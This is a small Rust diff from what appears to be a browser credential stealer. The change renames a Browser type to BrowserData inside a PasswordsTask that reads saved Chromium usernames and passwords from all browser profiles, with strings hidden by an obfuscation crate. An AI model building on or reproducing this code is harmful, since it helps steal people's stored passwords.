@@ -4,7 +4,7 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::Path;
-use crate::chromium::Browser;
+use crate::chromium::BrowserData;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Password};
 use obfstr::obfstr as s;
 use database::TableRecord;
@@ -15,11 +15,11 @@ const LOGINS_USERNAME_VALUE: usize = 3;
 const LOGINS_PASSWORD_VALUE: usize = 5;
 
 pub(super) struct PasswordsTask {
-    browser: Arc<Browser>
+    browser: Arc<BrowserData>
 }
 
 impl PasswordsTask {
-    pub(super) fn new(browser: Arc<Browser>) -> Self {
+    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
         Self { browser }
     }
 }
